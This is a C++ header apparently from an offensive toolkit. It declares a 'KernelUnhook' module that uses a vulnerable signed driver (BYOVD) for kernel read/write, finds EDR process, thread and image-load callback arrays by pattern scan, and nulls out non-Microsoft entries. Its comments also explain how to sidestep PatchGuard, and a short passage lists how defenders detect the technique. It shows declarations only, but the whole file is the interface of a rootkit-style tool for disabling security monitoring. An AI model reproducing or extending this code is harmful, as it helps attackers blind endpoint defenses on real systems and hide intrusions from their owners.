#pragma once
#ifndef KERNELUNHOOK_H
#define KERNELUNHOOK_H
#include "common.h"
#include "BYOVD.h"

// KernelUnhook — remove EDR kernel callbacks using BYOVD kernel R/W.
// MITRE T1014 (Rootkit), T1562.001 (Impair Defenses).
//
// EDRs register kernel callbacks to receive notifications for:
//   - Process/thread creation:  PsSetCreateProcessNotifyRoutine(Ex)
//   - Image load:               PsSetLoadImageNotifyRoutine
//   - Registry operations:      CmRegisterCallback
//   - Object access:            ObRegisterCallbacks
//
// These callback arrays live in kernel memory. With arbitrary kernel R/W
// (via BYOVD), we can walk these arrays and NULL out any entries that
// don't belong to a Microsoft-signed driver module.
//
// Technique (PatchGuard note):
//   PatchGuard periodically verifies some kernel structures. Zeroing callback
//   entries rather than patching kernel code avoids most PatchGuard checks
//   (callbacks are data, not protected code). However, some EDRs re-register
//   callbacks when theirs are removed — persistent removal requires monitoring.
//
// Key kernel symbols required (from ntoskrnl.exe, resolved by offset):
//   PspCreateProcessNotifyRoutine  — array of 64 EX_CALLBACK entries
//   PspCreateThreadNotifyRoutine   — array of 64 EX_CALLBACK entries
//   PspLoadImageNotifyRoutine      — array of 8 EX_CALLBACK entries
//
// These offsets change per Windows version — we resolve them by pattern scan
// of ntoskrnl's .text (the BYOVD kernel-read lets us scan kernel memory).
//
// What a strong detector catches:
//   - PatchGuard triggers on protected kernel data modification (some versions)
//   - A surviving EDR (not removed) that monitors callback array writes
//   - Kernel ETW provider: changes to PsCreateProcessNotifyRoutine table
//   - Re-registration: EDR watchdog thread re-registers on callback removal
//
// MITRE T1014, T1562.001

namespace KernelUnhook {
    // Find PspCreateProcessNotifyRoutine array in kernel via pattern scan.
    // Requires open kernel device handle (from BYOVD::OpenDevice()).
    DWORD64 FindProcessNotifyArray(HANDLE hDev);

    // Remove all non-MS callback entries from the process notify array.
    // Non-MS = driver not in Windows\System32\drivers, not signed by Microsoft.
    std::string RemoveProcessCallbacks(HANDLE hDev);

    // Same for image-load callbacks.
    std::string RemoveImageLoadCallbacks(HANDLE hDev);

    // List all registered process-notify callbacks (names of owning drivers).
    std::string ListCallbacks(HANDLE hDev);

    // Full run: find + list + remove non-MS callbacks for all callback types.
    std::string NukeEDRCallbacks(HANDLE hDev);
}

#endif
